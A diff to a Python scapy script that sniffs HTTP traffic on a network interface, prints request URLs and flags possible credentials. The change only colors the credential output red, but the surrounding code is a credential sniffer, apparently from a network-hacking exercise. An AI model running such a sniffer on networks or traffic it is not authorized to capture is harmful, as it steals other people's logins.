@@ -1,5 +1,7 @@
 from scapy.layers import http
 import scapy.all as scapy
+RED = "\033[91m"
+RESET = "\033[0m"
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet    )
@@ -11,7 +13,7 @@ def process_packet(packet):
         print(f"HTTP Request to >> {url}")
         credentials = get_credentials(packet)
         if credentials:
-            print(f"Possible credentials >> {credentials}")
+            print(f"{RED}Possible credentials >> {credentials}{RESET}")
 
 def get_url(packet):
     return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
